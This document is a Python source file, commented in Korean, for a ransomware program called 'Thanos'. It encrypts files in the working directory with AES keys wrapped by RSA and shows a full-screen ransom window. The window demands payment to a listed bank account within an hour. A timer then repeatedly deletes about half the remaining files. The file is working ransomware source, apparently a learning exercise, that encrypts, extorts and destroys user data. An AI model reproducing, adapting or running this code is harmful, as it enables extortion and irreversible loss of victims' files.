from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random  #RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
import glob
import os
import threading
from time import sleep

#gui 라이브러리
import tkinter
from ui import thanos
from tkinter.ttk import Label
from PIL import Image, ImageTk


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
def key_submit():
    pw = str(password.get())
    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
    label6.pack()
    pwbutton.destroy()
    label4.destroy()
    password.destroy()

window = tkinter.Tk()
window.title("ransomware")
window.state('zoomed')  # maximize the window
height = window.winfo_height()  # ...
width = window.winfo_width()
window.configure(background="black")

label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
label1.pack()
label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
label2.pack()
label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
label3.pack()

label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
label4.pack()
password = tkinter.Entry(window)
password.pack()

pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
pwbutton.pack()

image = tkinter.PhotoImage(file="../ui/face.png")

label5 = tkinter.Label(window, image=image)
label5.pack()


iv = os.urandom(16)

#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수

def list_files(path, ext=None):
    filelist=[]
    print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path,name)):
            if name.endswith('.py'):
                continue
            if (ext == None):
                filelist.append(name)
            elif name.endswith(ext):
                filelist.append(name)

    print("filelist: \n", filelist)
    return filelist

#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수

def startTimer():
    print("파일 삭제를 시작합니다")
    #5초에 한번씩 파일 삭제
    #threading.Timer(5,remove_files(os.getcwd())).start()
    sleep(5)
    remove_files(os.getcwd())

def remove_files(path,ext=None):
    #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
    #label6.pack()
    #label5.destroy()
    remove_filelist=[]
    print("os.removelistdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            if name.endswith('.py'):
                continue
            if (ext == None):
                remove_filelist.append(name)
            elif name.endswith(ext):
                remove_filelist.append(name)
    print("remove_filelist: \n", remove_filelist)

    if(len(remove_filelist)>2):
        n = 0
        if((len(remove_filelist) / 2 ) % 2 == 0):
            n=round(len(remove_filelist)/2) #정수로 변환
            print("지울 파일 개수: ", n)
        else:
            n=round(len(remove_filelist)/2)-1
            print("지울 파일 개수: ", n)

        for i in range(n):
            print(remove_filelist[i])
            os.remove(remove_filelist[i])
        print("파일 중 절반이 삭제되었습니다.")
    #파일이 1개 or 2개 남았을 경우
    elif(len(remove_filelist)>0):
        os.remove(remove_filelist[0])
    else:
#        for i in range(2):
#            os.remove(remove_filelist[i])
#        print("파일 중 절반이 삭제되었습니다.")
        print("더 이상 삭제할 파일이 없습니다")
        exit(0)

    #label6.destroy()
    #label7 = tkinter.Label(window, image=image)
    #label7.pack()

    threading.Timer(5, remove_files, [os.getcwd()]).start()

#/////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수

def enc(key, cipher, in_filename, out_filename=None):

    # RSA 로 AES 키 암호화
    ciphertext = cipher.encrypt(key)  # 128비트
    print(cipher.decrypt(ciphertext))
    print("\nRSA를 통한 key 암호화문 : \n", ciphertext, "\n")
    # /////////////////////////////////////////////////

    print("---START ENCRYPTION : AES")
    mode = AES.MODE_CBC
    #iv = b'Sixteen byte iv3'

    # enc의 결과로 나오는 파일 이름을 정한다
    if not out_filename:
        out_filename = in_filename + '.antdd'

    # 먼저, 바이너리 형식으로 파일을 읽어온다
    # 읽어온 것은 data로 저장

    with open(in_filename, 'rb') as infile:
        # 일단 읽어온 것을 출력해보자
        data = infile.read()

        print("1. Plain Message was: ")
        print(data, '\n', len(data))
        sizeOfData = len(data)

        # 패딩에 대한 부분
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        print("2. After Padding Message was: ")
        print(data)

        with open(out_filename, 'wb') as outfile:
            pass

        #이어쓰기 모드
        with open(out_filename, 'ab') as outfile:
            #RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode())
            print('\ndata size : ',len(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode()))
            #RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            # 그럼 e_data도 마찬가지로 b''형식이다.

            print("3. e_data Message was: ")
            print(e_data)

            outfile.write(e_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    with open(out_filename, 'rb') as result:
        print("4. encryption result is: ", out_filename)
        print(result.read())

    print("---END ENCRYPTION : AES")
def dec( cipher, in_filename, out_filename):
    print("---START DECRYPTION : AES")

    mode = AES.MODE_CBC
    #iv = b'Sixteen byte iv3'

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    print(out_filename)

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()
        print('size : ',e_data[:64832])
        #RSA : 파일의 크기와 암호화된 AES 키 추출
        sizeOfData = int(e_data[:64832].lstrip(b'0').decode())
        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
        print(len(aes_key_enc), aes_key_enc)
        #RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[64960:]

        #RSA : 추출한 AES 키 복호환
        aes_key_dec = cipher.decrypt(aes_key_enc)
        print('AES key was :', aes_key_dec)
        print("1. Cipher was: ")
        print(e_data)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)

            d_data = decryptor.decrypt(e_data)

            print("2. before unpadding d_data")
            print(d_data)


            d_data = d_data[:sizeOfData]
            # 패딩 처리한 부분을 다시 지워준다
            # d_data = e_data[:-x[-1]] 에서 x[-1]의 값은 100
            # 바이트 크기로 인식하기 때문에 d->ascii->100
            #d_data = d_data[:d_data.rfind(x[-1]) + 1]

            #####print("어쩌구 후 d_data: ", d_data.decode('ascii'))
            ##target의 내용이 한글인 경우 에러발생
            # 아스키코드로 진행된 경우

            print("3. after unpadding d_data")
            # print(d_data.decode(encoding='utf-8'))

            outfile.write(d_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    # 읽을 때 rb가 아니라 r로 읽으면
    # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
    with open(out_filename, 'rb') as result:
        print("4. decryption result is: ", out_filename)
        print(result.read())

    print("---END DECRYPTION : AES")

#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수

if __name__ == "__main__":

    key = os.urandom(16)

    #RSA : 키, 싸이퍼 생성
    random_generator = Random.new().read
    rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
    cipher = PKCS1_OAEP.new(rsa_key)
    private_key = rsa_key.export_key()
    print("비밀키는 : ", private_key)


    #timer 테스트
    enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
    # 나중에 전체 트래킹 하는 법 알아야함
    print("enc_targetlist: \n", enc_targetlist)
    for enc_target in enc_targetlist:
        if enc_target.split('.')[-1] == 'antdd':
            continue
        enc(key, cipher, enc_target, out_filename=None)

    # 타이머 시작 코드
    th1 = threading.Thread(target=startTimer)
    th1.start()

    # gui 시작 코드
    th2 = threading.Thread(window.mainloop())
    th2.start()

